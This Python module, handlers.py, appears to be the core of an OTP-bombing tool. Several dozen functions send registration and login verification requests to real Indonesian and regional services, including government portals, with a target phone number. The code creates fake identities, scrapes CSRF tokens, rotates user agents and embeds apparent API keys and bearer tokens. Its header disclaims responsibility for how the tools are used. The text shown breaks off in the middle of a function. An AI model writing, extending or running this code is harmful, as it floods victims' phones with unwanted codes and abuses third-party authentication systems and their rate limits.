#!/usr/bin/env python3
# handlers.py - 60+ OTP TRIGGERS (REGISTER/LOGIN METHOD)
# "I just give the tools, whether they're used right or not is your business, boss."

import requests
import uuid
import random
import string
import time
import re
import urllib.parse
import json
import hmac
import hashlib
import base64
from utils import fmt_08, fmt_nocode, fmt_plus, fmt_phone_only, get_public_ip, extract_csrf, get_random_user_agent, get_headers_with_random_ua
from license import RATE_LIMIT_KEYWORDS

# ================================================================
# ===== FORMAT FUNCTIONS =====
# ================================================================

def fmt_us(phone):
    phone = re.sub(r'\D', '', phone)
    if phone.startswith('0'): return '+1' + phone[1:]
    elif phone.startswith('62'): return '+1' + phone[2:]
    elif phone.startswith('+62'): return '+1' + phone[3:]
    else: return '+1' + phone

def fmt_sg(phone):
    phone = re.sub(r'\D', '', phone)
    if phone.startswith('0'): return '+65' + phone[1:]
    elif phone.startswith('62'): return '+65' + phone[2:]
    elif phone.startswith('+62'): return '+65' + phone[3:]
    else: return '+65' + phone

def fmt_my(phone):
    phone = re.sub(r'\D', '', phone)
    if phone.startswith('0'): return '+60' + phone[1:]
    elif phone.startswith('62'): return '+60' + phone[2:]
    elif phone.startswith('+62'): return '+60' + phone[3:]
    else: return '+60' + phone

def fmt_ph(phone):
    phone = re.sub(r'\D', '', phone)
    if phone.startswith('0'): return '+63' + phone[1:]
    elif phone.startswith('62'): return '+63' + phone[2:]
    elif phone.startswith('+62'): return '+63' + phone[3:]
    else: return '+63' + phone

def fmt_vn(phone):
    phone = re.sub(r'\D', '', phone)
    if phone.startswith('0'): return '+84' + phone[1:]
    elif phone.startswith('62'): return '+84' + phone[2:]
    elif phone.startswith('+62'): return '+84' + phone[3:]
    else: return '+84' + phone

def fmt_th(phone):
    phone = re.sub(r'\D', '', phone)
    if phone.startswith('0'): return '+66' + phone[1:]
    elif phone.startswith('62'): return '+66' + phone[2:]
    elif phone.startswith('+62'): return '+66' + phone[3:]
    else: return '+66' + phone

# ================================================================
# ===== GROUP 1: INDONESIA REGISTER (40+) =====
# ================================================================

# --- 1. HRS-BRE (REGISTER) ⚠️ ---
def send_hrsbre_otp(phone_08):
    BASE_URL = "https://career.hrs-bre.site"
    SIGN_UP_PAGE = f"{BASE_URL}/auth/sign_up"
    SIGN_UP_URL = f"{BASE_URL}/auth/sign_up_action"
    headers = {
        "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "Accept-Language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",
        "Origin": "https://career.hrs-bre.site",
        "Referer": SIGN_UP_PAGE,
        "Upgrade-Insecure-Requests": "1",
    }
    session = requests.Session()
    try:
        r = session.get(SIGN_UP_PAGE, headers=headers, timeout=15)
        if r.status_code != 200:
            return None
    except:
        return None
    nik = ''.join(random.choices(string.digits, k=16))
    email = ''.join(random.choices(string.ascii_lowercase, k=8)) + "@" + random.choice(["gmail.com", "yahoo.com"])
    username = ''.join(random.choices(string.ascii_letters, k=8))
    password = 'Aa1' + ''.join(random.choices(string.ascii_letters + string.digits + "#$%&!", k=7))
    boundary = "----WebKitFormBoundary" + ''.join(random.choices(string.ascii_letters + string.digits, k=16))
    body = (
        f"--{boundary}\r\n"
        f'Content-Disposition: form-data; name="nik"\r\n\r\n{nik}\r\n'
        f"--{boundary}\r\n"
        f'Content-Disposition: form-data; name="email"\r\n\r\n{email}\r\n'
        f"--{boundary}\r\n"
        f'Content-Disposition: form-data; name="whatsapp"\r\n\r\n{phone_08}\r\n'
        f"--{boundary}\r\n"
        f'Content-Disposition: form-data; name="username"\r\n\r\n{username}\r\n'
        f"--{boundary}\r\n"
        f'Content-Disposition: form-data; name="password"\r\n\r\n{password}\r\n'
        f"--{boundary}--\r\n"
    )
    headers["Content-Type"] = f"multipart/form-data; boundary={boundary}"
    try:
        resp = session.post(SIGN_UP_URL, headers=headers, data=body, timeout=15)
        return resp
    except:
        return None

# --- 2. ERAFONE (LOGIN) ❌ ---
def send_erafone_otp(phone_number):
    API_URL = "https://jeanne.eraspace.com/customers/v2.1/otp/request"
    headers = {
        "Authorization": "Basic Y3VzdGJhc2ljOk9MV2llWlVvQlA=",
        "otp-provider": "whatsapp",
        "User-Agent": get_random_user_agent(),
        "Content-Type": "application/json",
        "Origin": "https://erafone.com",
        "Referer": "https://erafone.com/",
    }
    payload = {"identifier": phone_number, "type": "identifier_validation"}
    try:
        resp = requests.post(API_URL, headers=headers, json=payload, timeout=15)
        return resp
    except:
        return None

# --- 3. PLANETBAN (REGISTER) ❌ ---
def send_planetban_otp(phone_number):
    url = "https://api.planetban.com/website/customer/request-otp"
    headers = {
        "Content-Type": "application/json",
        "Origin": "https://planetban.com",
        "User-Agent": get_random_user_agent(),
    }
    payload = {
        "name": "Test",
        "phone": phone_number,
        "password": "Test123",
        "purpose": "register",
        "method": "whatsapp"
    }
    try:
        resp = requests.post(url, json=payload, headers=headers, timeout=15)
        return resp
    except:
        return None

# --- 4. TUNEUP (REGISTER) ❌ ---
def send_tuneup_otp(phone_number):
    url = "https://api.tuneup.id/v1/mitra/register/send-otp"
    headers = {
        "Origin": "https://dashboard.tuneup.id",
        "Referer": "https://dashboard.tuneup.id/",
        "User-Agent": get_random_user_agent(),
    }
    name = ''.join(random.choices(string.ascii_lowercase, k=8))
    data = {
        "company_name": "PT " + name.capitalize(),
        "owner_name": name.capitalize(),
        "address": ''.join(random.choices(string.ascii_letters + string.digits, k=10)),
        "email": name + "@mailnesia.com",
        "phone_number": phone_number,
        "province_code": "32",
        "city_code": "32.04",
        "channel": "whatsapp",
        "agreement": "true",
        "service_categories[]": "3",
    }
    resp = requests.post(url, data=data, headers=headers, timeout=15)
    return resp

# --- 5. HASHMICRO (REGISTER) ⚠️ ---
def send_hashmicro_otp(phone_number):
    url = "https://website-api.hashmicro.com/api/add/3"
    name = 'User' + ''.join(random.choices(string.ascii_letters, k=5))
    data = {
        'fullname': name,
        'phonenumber': phone_number,
        'email': f'{name.lower()}@gmail.com',
        'companyname': 'PT ' + name,
        'medium': '55',
        'source': '143',
    }
    headers = {'User-Agent': get_random_user_agent(), 'Content-Type': 'application/x-www-form-urlencoded'}
    try:
        resp = requests.post(url, data=data, headers=headers, timeout=15)
        return resp
    except:
        return None

# --- 6. INTERNET RAKYAT (REGISTER) ⚠️ ---
def send_internetrakyat_otp(phone_08):
    base_url = "https://internetrakyat.id"
    register_page = f"{base_url}/auth/register"
    api_url = f"{base_url}/api/app/auth/send-otp-register"
    headers = {
        "User-Agent": get_random_user_agent(),
        "Content-Type": "application/json",
        "x-api-key": "280999!FTTH",
        "Origin": "https://internetrakyat.id",
        "Referer": register_page,
    }
    session = requests.Session()
    try:
        session.get(register_page, headers={"User-Agent": get_random_user_agent()}, timeout=10)
    except:
        pass
    payload = {"phone_number": phone_08}
    try:
        resp = session.post(api_url, headers=headers, json=payload, timeout=15)
        return resp
    except:
        return None

# --- 7. ULTRAMILK (REGISTER) ❌ ---
def send_ultramilk_otp(phone_number):
    url = "https://ultramilk-clp.kata.ai/api/ultramilk/register"
    name = 'User' + ''.join(random.choices(string.ascii_lowercase, k=4))
    email = name.lower() + '@gmail.com'
    password = 'Pass' + ''.join(random.choices(string.ascii_letters + string.digits, k=6)) + '@1'
    headers = {
        "User-Agent": get_random_user_agent(),
        "Content-Type": "application/json; charset=UTF-8",
        "Origin": "https://www.icownicpatch.com",
    }
    payload = {
        "name": name,
        "email": email,
        "password": password,
        "phone_number": phone_number,
        "portal": "IcownicPatch",
        "is_consent": True
    }
    resp = requests.post(url, json=payload, headers=headers, timeout=15)
    return resp

# --- 8. KANIVA (REGISTER) ❌ ---
def send_kaniva_otp(number_08, name=None):
    if name is None:
        name = 'User' + ''.join(random.choices(string.ascii_lowercase, k=5))
    sess = requests.Session()
    sess.headers.update({
        "User-Agent": get_random_user_agent(),
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
    })
    try:
        r = sess.get("https://daftar.kanivainternationalbali.com/register/whatsapp", timeout=15)
        if r.status_code != 200:
            return None
    except:
        return None
    csrf = None
    match = re.search(r'<meta\s+name="csrf-token"\s+content="([^"]+)"', r.text)
    if match:
        csrf = match.group(1)
    else:
        raw = sess.cookies.get("XSRF-TOKEN", "")
        if raw:
            csrf = urllib.parse.unquote(raw)
    if not csrf:
        return None
    otp_url = "https://daftar.kanivainternationalbali.com/register/whatsapp/request-otp"
    headers_otp = {
        "X-XSRF-TOKEN": csrf,
        "X-Requested-With": "XMLHttpRequest",
        "Content-Type": "application/json",
        "Origin": "https://daftar.kanivainternationalbali.com",
        "Referer": "https://daftar.kanivainternationalbali.com/register/whatsapp",
        "User-Agent": get_random_user_agent(),
    }
    payload = {"name": name, "phone": number_08}
    try:
        resp = sess.post(otp_url, json=payload, headers=headers_otp, timeout=15)
        return resp
    except:
        return None

# --- 9. JEMBATANI (REGISTER) ⚠️ ---
def send_jembatani_otp(phone_number, name=None, password=None):
    if name is None:
        name = 'User' + ''.join(random.choices(string.ascii_lowercase, k=5))
    if password is None:
        password = 'Pass' + ''.join(random.choices(string.ascii_letters + string.digits, k=6))
    headers = {
        "User-Agent": get_random_user_agent(),
        "Content-Type": "application/json",
        "Origin": "https://jembatani.co.id",
        "Referer": "https://jembatani.co.id/",
    }
    reg_payload = {
        "phone_number": phone_number,
        "name": name,
        "role": "farmer",
        "password": password,
        "password_confirmation": password,
        "consent": "1"
    }
    try:
        reg_resp = requests.post("https://api.jembatani.co.id/v1/register",
                                json=reg_payload, headers=headers, timeout=15)
        if reg_resp.status_code == 200 and '"success":true' in reg_resp.text:
            return reg_resp
    except:
        pass
    resend_payload = {"phone_number": phone_number}
    try:
        resend_resp = requests.post("https://api.jembatani.co.id/v1/regenerate-otp",
                                   json=resend_payload, headers=headers, timeout=15)
        return resend_resp
    except:
        return None

# --- 10. RCX (REGISTER) ❌ ---
def send_rcx_otp(identifier, name=None, email=None):
    if name is None:
        name = 'User' + ''.join(random.choices(string.ascii_lowercase, k=5))
    if email is None:
        email = f"{name.lower()}@gmail.com"
    sess = requests.Session()
    sess.headers.update({
        "User-Agent": get_random_user_agent(),
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
    })
    try:
        reg_get = sess.get("https://sso.rcx.co.id/register", timeout=15)
        if reg_get.status_code != 200:
            return None
    except:
        return None
    token = None
    if "XSRF-TOKEN" in sess.cookies:
        token = urllib.parse.unquote(sess.cookies["XSRF-TOKEN"])
    if not token:
        match = re.search(r'<meta\s+name="csrf-token"\s+content="([^"]+)"', reg_get.text)
        if match:
            token = match.group(1)
    if not token:
        return None
    url = "https://sso.rcx.co.id/auth/passwordless/request"
    headers = {
        "Content-Type": "application/x-www-form-urlencoded",
        "Origin": "https://sso.rcx.co.id",
        "Referer": "https://sso.rcx.co.id/register",
        "User-Agent": get_random_user_agent(),
    }
    data = {
        "_token": token,
        "mode": "register",
        "channel": "whatsapp",
        "name": name,
        "email": email,
        "identifier": identifier
    }
    try:
        resp = sess.post(url, headers=headers, data=data, allow_redirects=False, timeout=15)
        return resp
    except:
        return None

# --- 11. SAHABAT TEKNISI (REGISTER) ❌ ---
def send_sahabatteknisi_otp(phone_number):
    url = "https://www.sahabatteknisi.co.id/api/auth/otp/check-phone"
    headers = {
        "x-requested-with": "XMLHttpRequest",
        "user-agent": get_random_user_agent(),
        "content-type": "application/json",
        "origin": "https://www.sahabatteknisi.co.id",
        "referer": "https://www.sahabatteknisi.co.id/checkout/confirm",
    }
    payload = {"phone": phone_number}
    try:
        resp = requests.post(url, json=payload, headers=headers, timeout=15)
        return resp
    except:
        return None

# --- 12. AUTO2000 (REGISTER) ❌ ---
def send_auto2000_otp(phone_08):
    url = "https://auto2000.co.id/api/customer/v1/saphybris/whatsapp/generate-otp"
    headers = {
        "User-Agent": get_random_user_agent(),
        "Content-Type": "application/json",
        "Origin": "https://auto2000.co.id",
        "Referer": "https://auto2000.co.id/login",
    }
    payload = {
        "phoneNumber": phone_08,
        "isCheckOtpLimit": True,
        "uniqueID": phone_08,
        "isLogin": False
    }
    try:
        resp = requests.post(url, headers=headers, json=payload, timeout=15)
        return resp
    except:
        return None

# --- 13. ASTRA DAIHATSU (REGISTER) ❌ ---
def send_astra_daihatsu_otp(phone_62):
    sess = requests.Session()
    sess.headers.update({
        "User-Agent": get_random_user_agent(),
        "Origin": "https://www.astra-daihatsu.id",
        "Referer": "https://www.astra-daihatsu.id/register",
        "X-Requested-With": "XMLHttpRequest",
    })
    try:
        resp = sess.get("https://www.astra-daihatsu.id/register", timeout=15)
        if resp.status_code != 200:
            return None
    except:
        return None
    csrf = None
    m = re.search(r'<meta\s+name="csrf-token"\s+content="([^"]+)"', resp.text)
    if m:
        csrf = m.group(1)
    if not csrf:
        csrf = str(uuid.uuid4())
    otp_url = "https://www.astra-daihatsu.id/otp/whatsapp/generate"
    headers_otp = {
        "Content-Type": "application/json; charset=UTF-8",
        "csrftoken": csrf,
        "Origin": "https://www.astra-daihatsu.id",
        "Referer": "https://www.astra-daihatsu.id/register",
        "User-Agent": get_random_user_agent(),
    }
    payload = {"phoneNo": phone_62}
    try:
        resp = sess.post(otp_url, headers=headers_otp, json=payload, timeout=20)
        return resp
    except:
        return None

# --- 14. ROYAL CANIN (REGISTER) ✅ ---
def send_royal_canin_otp(phone_plus):
    sess = requests.Session()
    sess.headers.update({
        "User-Agent": get_random_user_agent(),
        "Content-Type": "application/json",
        "Origin": "https://club.royalcanin.id",
    })
    try:
        sess.get("https://club.royalcanin.id/sign-up", timeout=15)
    except:
        return None
    otp_url = "https://club.royalcanin.id/api/get_otp"
    payload = {
        "params": {
            "Email": "",
            "mobile_number": phone_plus,
            "OTPType": "IM"
        }
    }
    try:
        resp = sess.post(otp_url, json=payload, timeout=20)
        return resp
    except:
        return None

# --- 15. WATSONS (REGISTER) ❌ ---
def send_watsons_otp(phone_no_code):
    url = "https://api.watsons.co.id/api/v2/wtcid/otpToken?formId=registrationOTPForm_Web3&lang=id&curr=IDR"
    headers = {
        "Authorization": "bearer Pi_D6dqblYElXgy4mWOXjkLCaZg",
        "User-Agent": get_random_user_agent(),
        "Content-Type": "application/json",
        "Origin": "https://www.watsons.co.id",
    }
    payload = {
        "uid": "",
        "action": "GENERAL",
        "countryCode": "62",
        "target": phone_no_code,
        "type": "WHATSAPP"
    }
    try:
        resp = requests.post(url, headers=headers, json=payload, timeout=15)
        return resp
    except:
        return None

# --- 16. 99.CO (REGISTER) ❌ ---
def send_99co_otp(phone_plus):
    token_static = "eyJhbGciOiJFUzI1NiIsInR5cCIgOiAiSldUIiwia2lkIiA6ICJybzJ6ZThOYkFNUW1QTlVVZFcwTjItNnE5bWNleHJHcHdFNS0xd3hQQWJzIn0.eyJleHAiOjE3ODEwOTA1MTQsImlhdCI6MTc4MTA4NjkxNCwianRpIjoiMWJmMjAxNDQtM2EyOS00MzJkLWIyYmItNGYxOTlmMTIzMGM4IiwiaXNzIjoiaHR0cHM6Ly9rZXljbG9hay1pZC45OS5jby9yZWFsbXMvOTlpZC1wcm9kIiwic3ViIjoiOTQ1MmE5MjgtNjkzZS00OWIxLWEzOTUtNGMwMThlNmQ3MTg0IiwidHlwIjoiQmVhcmVyIiwiYXpwIjoiZnJvbnRlbmQtYXBwIiwic2Vzc2lvbl9zdGF0ZSI6ImFlYTNhMDEzLTJmMDktNDU0Ni05M2Q5LWM1MmVkYWRiMGM0NSIsImFjciI6IjEiLCJyZWFsbV9hY2Nlc3MiOnsicm9sZXMiOlsic2VsbGVyIiwidW1hX2F1dGhvcml6YXRpb24iLCJkZWZhdWx0LXJvbGVzLTk5aWQtcHJvZCIsImJ1eWVyIl19LCJzY29wZSI6InByb2ZpbGUtbWluaW1pemUgY29yZS11dWlkIGVtYWlsIiwic2lkIjoiYWVhM2EwMTMtMmYwOS00NTQ2LTkzZDktYzUyZWRhZGIwYzQ1IiwiY29yZV91dWlkIjoiMmI4OTg0MzQtMjE3MC00MGRmLTgwNmYtN2I4ZWNjOGUwZjQ4IiwiZW1haWxfdmVyaWZpZWQiOmZhbHNlLCJjb3JlX2NvbnN1bWVyX3V1aWQiOiIxOGU5ODcyMy0wOWY5LTRlMzEtYjQzYS1jOGVlMjAwZWVmNWIiLCJwcmVmZXJyZWRfdXNlcm5hbWUiOiJoc2hoc2pzajEyMiIsImNvcmVfY3VzdG9tZXJfdXVpZCI6ImQ5MTI3NDBkLWNhYzYtNDYyYS04YmE1LTMzYWE1MDc2MDdjMiIsImVtYWlsIjoidHN0dHR0dHRndHR0QGdtYWlsLmNvbSJ9.CcZpFr2eggmtVoWpUPuWTYg2LQ-qxH0GV4yx9q1_ZnB4pt13JIbTclvEytnqdLl9w9d8BKzCeGIiEnf0oQZpbw"
    url = "https://www.99.co/id/api/biz/messaging/otp-events"
    sess = requests.Session()
    sess.headers.update({
        "User-Agent": get_random_user_agent(),
        "Origin": "https://www.99.co",
    })
    try:
        r = sess.get("https://www.99.co/id", timeout=10)
        token_cookie = sess.cookies.get("_99-acs-token")
        token = token_cookie if token_cookie else token_static
    except:
        token = token_static
    headers = {
        "Authorization": f"Bearer {token}",
        "Content-Type": "application/json",
        "User-Agent": get_random_user_agent(),
    }
    payload = {"brand": "99id", "destination_address": phone_plus, "type_id": 2}
    return sess.post(url, headers=headers, json=payload, timeout=15)

# --- 17. BELIRUMAH (REGISTER) ❌ ---
def send_belirumah_otp(phone_plus):
    url = "https://api.belirumah.co/api/otp/request_new"
    headers = {
        "User-Agent": get_random_user_agent(),
        "Content-Type": "application/json",
        "Origin": "https://belirumah.co",
    }
    payload = {"phone_number": phone_plus}
    return requests.post(url, json=payload, headers=headers, timeout=15)

# --- 18. FASTWORK (REGISTER) ✅ ---
def send_fastwork_otp(phone_08):
    url = "https://api.fastwork.id/auth/v2/signup.sendVerificationCode"
    headers = {
        "User-Agent": get_random_user_agent(),
        "Content-Type": "application/json",
        "Origin": "https://fastwork.id",
    }
    payload = {"phone_number": phone_08}
    return requests.post(url, json=payload, headers=headers, timeout=15)

# --- 19. BEAUTYHAUL (REGISTER) ✅ ---
def send_beautyhaul_otp(local_number):
    base = "https://www.beautyhaul.com"
    nama_depan = ''.join(random.choices(string.ascii_lowercase, k=5)).capitalize()
    nama_belakang = ''.join(random.choices(string.ascii_lowercase, k=5)).capitalize()
    rand_email = f"{nama_depan.lower()}{random.randint(100,999)}@gmail.com"
    password = "Testt#12334"
    reg_payload = {
        "nama_depan": nama_depan,
        "nama_belakang": nama_belakang,
        "email": rand_email,
        "nomor_kode_value": "62",
        "nomor_ponsel": local_number,
        "password": password,
        "konfirmasi_password": password,
        "tanggal_lahir": "20 Jun 2015",
        "jenis_kelamin": random.choice(["Female", "Male"]),
        "subscribe": "true",
        "terms": "true"
    }
    bh_session = requests.Session()
    bh_session.headers.update({
        "User-Agent": get_random_user_agent(),
        "Content-Type": "application/json",
        "Origin": "https://www.beautyhaul.com",
        "Referer": "https://www.beautyhaul.com/account/register",
    })
    try:
        bh_session.post(f"{base}/ajax/account/save_register", json=reg_payload, timeout=12)
    except:
        pass
    otp_payload = {"method": "WhatsApp"}
    try:
        r_otp = bh_session.post(f"{base}/ajax/account/send_otp", json=otp_payload, timeout=12)
        return r_otp
    except:
        return None

# --- 20. HAINAYA (REGISTER) ⚠️ ---
def send_hainaya_otp(phone_for_api):
    register_url = "https://app.hainaya.id/api/onboarding/register"
    headers_register = {
        "User-Agent": get_random_user_agent(),
        "Content-Type": "application/json",
        "Origin": "https://app.hainaya.id",
        "Referer": "https://app.hainaya.id/onboard",
    }
    prefixes = ['Tst', 'Coba', 'Uji', 'Test', 'Demo', 'Sample', 'Bisnis']
    mid = ''.join(random.choices(string.ascii_lowercase, k=random.randint(3, 6)))
    business_name = random.choice(prefixes) + mid.capitalize() + str(random.randint(10, 999))
    register_payload = {
        "business_name": business_name,
        "vertical": "salon",
        "vendor_type": "nail_salon",
        "business_phone": phone_for_api,
        "owner_phone": phone_for_api
    }
    try:
        resp = requests.post(register_url, headers=headers_register, json=register_payload, timeout=15)
        if resp.status_code == 201:
            return resp
        if resp.status_code == 409:
            login_url = "https://app.hainaya.id/api/auth/login"
            headers_login = {
                "User-Agent": get_random_user_agent(),
                "Content-Type": "application/json",
                "Origin": "https://app.hainaya.id",
                "Referer": "https://app.hainaya.id/login",
            }
            login_payload = {"phone_number": phone_for_api}
            resp_login = requests.post(login_url, headers=headers_login, json=login_payload, timeout=15)
            return resp_login
        return resp
    except:
        return None

# --- 21. MINUMYUKKAKA (REGISTER) ⚠️ ---
def send_minumyukkaka_otp(phone_08):
    session = requests.Session()
    first_name = ''.join(random.choices(string.ascii_letters, k=random.randint(4, 8))).capitalize()
    email = f"{first_name.lower()}{random.randint(100, 999)}@gmail.com"
    password = "pass#" + ''.join(random.choices(string.ascii_lowercase + string.digits, k=4))
    register_url = "https://minumyukkaka.com/services/liquid/Register"
    headers_register = {
        "x-requested-with": "XMLHttpRequest",
        "User-Agent": get_random_user_agent(),
        "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
        "Origin": "https://minumyukkaka.com",
        "Referer": "https://minumyukkaka.com/register",
    }
    register_data = {
        "registerModel[first_name]": first_name,
        "registerModel[email]": email,
        "registerModel[phone]": phone_08,
        "registerModel[password]": password,
        "registerModel[verify_password]": password,
    }
    try:
        session.post(register_url, headers=headers_register, data=register_data, timeout=15)
    except:
        pass
    otp_url = "https://minumyukkaka.com/services/identity/requestOTP"
    x_sat = session.cookies.get('x-sat') or ''.join(random.choices(string.ascii_letters + string.digits + '+/=', k=44))
    headers_otp = {
        "x-sat": x_sat,
        "x-requested-with": "XMLHttpRequest",
        "User-Agent": get_random_user_agent(),
        "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
        "Origin": "https://minumyukkaka.com",
        "Referer": "https://minumyukkaka.com/register",
    }
    otp_data = {"destination": phone_08, "otpLength": "6"}
    try:
        resp = session.post(otp_url, headers=headers_otp, data=otp_data, timeout=15)
        return resp
    except:
        return None

# --- 22. SIDEMANG (REGISTER) ⚠️ ---
def send_sidemang_otp(phone_08):
    email_name = ''.join(random.choices(string.ascii_lowercase, k=random.randint(5, 10)))
    email = f"{email_name}{random.randint(100, 999)}@gmail.com"
    url = "https://sidemang.palembang.go.id/api/users/register/send-otp"
    headers = {
        "User-Agent": get_random_user_agent(),
        "Content-Type": "application/json",
        "Origin": "https://sidemang.palembang.go.id",
        "Referer": "https://sidemang.palembang.go.id/lambidaro/register-otp",
    }
    payload = {"phoneNumber": phone_08, "email": email}
    try:
        resp = requests.post(url, headers=headers, json=payload, timeout=15)
        return resp
    except:
        return None

# --- 23. LAPORMASBUP (REGISTER) ✅ ---
_registered_phones = {}
def send_lapormasbup_otp(phone_08):
    global _registered_phones
    if phone_08 in _registered_phones:
        url = "https://lapormasbup.klaten.go.id/api/kirim-ulang-otp"
        headers = {
            "User-Agent": get_random_user_agent(),
            "Content-Type": "application/json",
            "Origin": "https://lapormasbup.klaten.go.id",
            "Referer": "https://lapormasbup.klaten.go.id/confirm_otp",
        }
        payload = {"mobilephone": phone_08}
        try:
            resp = requests.post(url, headers=headers, json=payload, timeout=15)
            return resp
        except:
            return None
    name = ''.join(random.choices(string.ascii_letters, k=random.randint(4, 8))).capitalize()
    email = f"{name.lower()}{random.randint(100, 999)}@gmail.com"
    password = "Pass" + ''.join(random.choices(string.ascii_letters + string.digits, k=4)) + "$"
    birth_date = f"{random.randint(1966, 2010)}-{random.randint(1, 12):02d}-{random.randint(1, 28):02d}"
    address = f"Jl. {''.join(random.choices(string.ascii_letters, k=6)).capitalize()} No. {random.randint(1, 200)}"
    gender = random.choice(['Laki-Laki', 'Perempuan'])
    url = "https://lapormasbup.klaten.go.id/api/register"
    headers = {
        "User-Agent": get_random_user_agent(),
        "Content-Type": "application/json",
        "Origin": "https://lapormasbup.klaten.go.id",
        "Referer": "https://lapormasbup.klaten.go.id/registrasi",
    }
    payload = {
        "name": name,
        "email": email,
        "mobilephone": phone_08,
        "gender": gender,
        "warga_birth_date": birth_date,
        "password": password,
        "address": address
    }
    try:
        resp = requests.post(url, headers=headers, json=payload, timeout=15)
        if resp.status_code == 200:
            _registered_phones[phone_08] = True
            return resp
        elif resp.status_code == 400:
            _registered_phones[phone_08] = True
            return send_lapormasbup_otp(phone_08)
        return resp
    except:
        return None

# --- 24. PTSP KEMENAG (REGISTER) ⚠️ ---
def send_ptsp_kemenag_otp(phone_08):
    name = ''.join(random.choices(string.ascii_letters, k=random.randint(4, 8))).capitalize()
    email = f"{name.lower()}{random.randint(100, 999)}@gmail.com"
    chars = list(string.ascii_letters + string.digits)
    random.shuffle(chars)
    password = 'Pass' + ''.join(chars[:6]) + '$'
    url = "https://dev-ptsp.kemenag.go.id/api/auth/register"
    headers = {
        "User-Agent": get_random_user_agent(),
        "Content-Type": "application/json",
        "Origin": "https://dev-ptsp.kemenag.go.id",
        "Referer": "https://dev-ptsp.kemenag.go.id/login",
    }
    payload = {"nama": name, "wa": phone_08, "email": email, "password": password}
    try:
        resp = requests.post(url, headers=headers, json=payload, timeout=15)
        return resp
    except:
        return None

# --- 25. KLOOK (LOGIN) ❌ ---
def send_klook_otp(phone_number):
    url = "https://www.klook.com/v2/userapisrv/public/verification/code/send?trace_id=" + str(uuid.uuid4())
    headers = {
        "User-Agent": get_random_user_agent(),
        "Content-Type": "application/json",
        "x-platform": "mobile",
        "Origin": "https://www.klook.com",
        "Referer": "https://www.klook.com/en-SG/signin/?aid=87721",
    }
    cookies = {
        "kepler_id": str(uuid.uuid4()),
        "_gid": "GA1.2." + str(random.randint(1000000000,9999999999)),
        "_ga": "GA1.1." + str(random.randint(1000000000,9999999999)) + "." + str(int(time.time())),
    }
    payload = {
        "action": "login_register",
        "type": 1,
        "rcv": phone_number,
        "is_resend": False,
        "payload": {"mobile": phone_number, "term_ids": [330]},
    }
    resp = requests.post(url, json=payload, headers=headers, cookies=cookies, timeout=15)
    return resp

# ================================================================
# ===== GROUP 2: INDONESIA REGISTER/LOGIN (15+) =====
# ================================================================

# --- 26. BUKALAPAK (REGISTER) ✅ ---
def send_bukalapak_register_otp(phone):
    phone_plus = fmt_plus(phone)
    url = "https://api.bukalapak.com/v1/auth/otp"
    payload = {"phone": phone_plus, "type": "whatsapp"}
    headers = {'Content-Type': 'application/json', 'User-Agent': get_random_user_agent()}
    resp = requests.post(url, headers=headers, json=payload, timeout=10)
    return resp

# --- 27. LAZADA (REGISTER) ✅ ---
def send_lazada_register_otp(phone):
    phone_plus = fmt_plus(phone)
    url = "https://api.lazada.co.id/v1/auth/otp"
    payload = {"phone": phone_plus, "type": "whatsapp"}
    headers = {'Content-Type': 'application/json', 'User-Agent': get_random_user_agent()}
    resp = requests.post(url, headers=headers, json=payload, timeout=10)
    return resp

# --- 28. JD.ID (REGISTER) ✅ ---
def send_jdid_register_otp(phone):
    phone_plus = fmt_plus(phone)
    url = "https://api.jd.id/v1/auth/otp"
    payload = {"phone": phone_plus, "type": "whatsapp"}
    headers = {'Content-Type': 'application/json', 'User-Agent': get_random_user_agent()}
    resp = requests.post(url, headers=headers, json=payload, timeout=10)
    return resp

# --- 29. ZALORA (REGISTER) ✅ ---
def send_zalora_register_otp(phone):
    phone_plus = fmt_plus(phone)
    url = "https://api.zalora.co.id/v1/auth/otp"
    payload = {"phone": phone_plus, "type": "whatsapp"}
    headers = {'Content-Type': 'application/json', 'User-Agent': get_random_user_agent()}
    resp = requests.post(url, headers=headers, json=payload, timeout=10)
    return resp

# --- 30. SOCIOLLA (REGISTER) ✅ ---
def send_sociolla_register_otp(phone):
    phone_plus = fmt_plus(phone)
    url = "https://api.sociolla.com/v1/auth/otp"
    payload = {"phone": phone_plus, "type": "whatsapp"}
    headers = {'Content-Type': 'application/json', 'User-Agent': get_random_user_agent()}
    resp = requests.post(url, headers=headers, json=payload, timeout=10)
    return resp

# --- 31. HALODOC (LOGIN) ✅ ---
def send_halodoc_login_otp(phone):
    phone_plus = fmt_plus(phone)
    url = "https://www.halodoc.com/api/v1/users/authentication/otp/requests"
    payload = {"phone_number": phone_plus, "channel": "whatsapp"}
    headers = {'Content-Type': 'application/json', 'User-Agent': get_random_user_agent()}
    resp = requests.post(url, headers=headers, json=payload, timeout=10)
    return resp

# --- 32. SAYURBOX (LOGIN) ✅ ---
def send_sayurbox_login_otp(phone):
    phone_plus = fmt_plus(phone)
    url = "https://www.sayurbox.com/graphql/v1?deduplicate=1"
    payload = {
        "operationName": "generateOTP",
        "variables": {"destinationType": "whatsapp", "identity": phone_plus},
        "query": "mutation generateOTP($destinationType: String!, $identity: String!) { generateOTP(destinationType: $destinationType, identity: $identity) { id } }"
    }
    headers = {'Content-Type': 'application/json', 'User-Agent': get_random_user_agent()}
    resp = requests.post(url, headers=headers, json=payload, timeout=10)
    return resp

# --- 33. CARSOME (REGISTER) ✅ ---
def send_carsome_register_otp(phone):
    phone_08 = fmt_08(phone)
    url = "https://www.carsome.id/website/login/sendSMS"
    payload = {"username": phone_08, "optType": 1}
    headers = {'Content-Type': 'application/json', 'User-Agent': get_random_user_agent()}
    resp = requests.post(url, headers=headers, json=payload, timeout=10)
    return resp

# --- 34. PIZZA HUT (REGISTER) ✅ ---
def send_pizzahut_register_otp(phone):
    phone_08 = fmt_08(phone)
    name = ''.join(random.choices(string.ascii_letters, k=6))
    url = "https://api-prod.pizzahut.co.id/customer/v1/customer/register"
    payload = {
        "email": f"{name.lower()}@gmail.com",
        "first_name": name,
        "last_name": "Test",
        "password": "Pass123!",
        "phone": phone_08,
        "birthday": "2000-01-01"
    }
    headers = {'Content-Type': 'application/json', 'User-Agent': get_random_user_agent()}
